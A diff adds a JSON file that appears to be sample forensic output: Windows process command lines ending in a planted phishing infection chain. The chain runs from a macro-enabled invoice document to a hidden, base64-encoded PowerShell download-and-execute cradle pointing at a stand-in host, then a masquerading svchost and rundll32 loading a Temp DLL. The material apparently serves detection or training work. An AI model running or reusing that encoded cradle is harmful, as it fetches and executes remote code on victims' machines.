@@ -1,0 +1,162 @@
+[
+ {
+  "PID": 4,
+  "Process": "System",
+  "Args": "Required memory at 0x20 is not valid (process exited?)"
+ },
+ {
+  "PID": 92,
+  "Process": "Registry",
+  "Args": "Required memory at 0x20 is not valid (process exited?)"
+ },
+ {
+  "PID": 352,
+  "Process": "smss.exe",
+  "Args": "\\SystemRoot\\System32\\smss.exe"
+ },
+ {
+  "PID": 452,
+  "Process": "csrss.exe",
+  "Args": "%SystemRoot%\\system32\\csrss.exe ObjectDirectory=\\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows"
+ },
+ {
+  "PID": 528,
+  "Process": "wininit.exe",
+  "Args": "wininit.exe"
+ },
+ {
+  "PID": 540,
+  "Process": "csrss.exe",
+  "Args": "%SystemRoot%\\system32\\csrss.exe ObjectDirectory=\\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows"
+ },
+ {
+  "PID": 604,
+  "Process": "winlogon.exe",
+  "Args": "winlogon.exe"
+ },
+ {
+  "PID": 640,
+  "Process": "services.exe",
+  "Args": "C:\\Windows\\system32\\services.exe"
+ },
+ {
+  "PID": 660,
+  "Process": "lsass.exe",
+  "Args": "C:\\Windows\\system32\\lsass.exe"
+ },
+ {
+  "PID": 780,
+  "Process": "svchost.exe",
+  "Args": "C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p"
+ },
+ {
+  "PID": 832,
+  "Process": "fontdrvhost.ex",
+  "Args": "\"fontdrvhost.exe\""
+ },
+ {
+  "PID": 848,
+  "Process": "svchost.exe",
+  "Args": "C:\\Windows\\system32\\svchost.exe -k RPCSS -p"
+ },
+ {
+  "PID": 920,
+  "Process": "dwm.exe",
+  "Args": "\"dwm.exe\""
+ },
+ {
+  "PID": 1012,
+  "Process": "svchost.exe",
+  "Args": "C:\\Windows\\system32\\svchost.exe -k LocalServiceNetworkRestricted -p"
+ },
+ {
+  "PID": 1104,
+  "Process": "svchost.exe",
+  "Args": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p"
+ },
+ {
+  "PID": 1340,
+  "Process": "spoolsv.exe",
+  "Args": "C:\\Windows\\System32\\spoolsv.exe"
+ },
+ {
+  "PID": 1520,
+  "Process": "svchost.exe",
+  "Args": "C:\\Windows\\system32\\svchost.exe -k NetworkService -p"
+ },
+ {
+  "PID": 1868,
+  "Process": "MsMpEng.exe",
+  "Args": "\"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090.11-0\\MsMpEng.exe\""
+ },
+ {
+  "PID": 2290,
+  "Process": "SearchIndexer.",
+  "Args": "C:\\Windows\\system32\\SearchIndexer.exe /Embedding"
+ },
+ {
+  "PID": 3120,
+  "Process": "explorer.exe",
+  "Args": "C:\\Windows\\Explorer.EXE"
+ },
+ {
+  "PID": 3388,
+  "Process": "taskhostw.exe",
+  "Args": "taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}"
+ },
+ {
+  "PID": 3410,
+  "Process": "sihost.exe",
+  "Args": "sihost.exe"
+ },
+ {
+  "PID": 3570,
+  "Process": "RuntimeBroker.",
+  "Args": "C:\\Windows\\System32\\RuntimeBroker.exe -Embedding"
+ },
+ {
+  "PID": 3672,
+  "Process": "chrome.exe",
+  "Args": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\""
+ },
+ {
+  "PID": 3700,
+  "Process": "chrome.exe",
+  "Args": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer --lang=en-US --renderer-client-id=7"
+ },
+ {
+  "PID": 3901,
+  "Process": "OneDrive.exe",
+  "Args": "\"C:\\Users\\jdoe\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background"
+ },
+ {
+  "PID": 5236,
+  "Process": "notepad.exe",
+  "Args": "\"C:\\Windows\\system32\\notepad.exe\" C:\\Users\\jdoe\\Documents\\meeting-notes.txt"
+ },
+ {
+  "PID": 4012,
+  "Process": "WINWORD.EXE",
+  "Args": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\jdoe\\Downloads\\Invoice_March_2026.docm\" /o \"\""
+ },
+ {
+  "PID": 4388,
+  "Process": "powershell.exe",
+  "Args": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdQBwAGQAYQB0AGUALQBjAGgAZQBjAGsALgBlAHgAYQBtAHAAbABlAC8AcwB0AGEAZwBlADIALgBwAHMAMQAnACkA"
+ },
+ {
+  "PID": 5400,
+  "Process": "conhost.exe",
+  "Args": "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1"
+ },
+ {
+  "PID": 4528,
+  "Process": "svchost.exe",
+  "Args": "C:\\Users\\Public\\svchost.exe -k netsvc"
+ },
+ {
+  "PID": 5120,
+  "Process": "rundll32.exe",
+  "Args": "rundll32.exe C:\\Users\\jdoe\\AppData\\Local\\Temp\\msupd.dll,DllRegisterServer"
+ }
+]
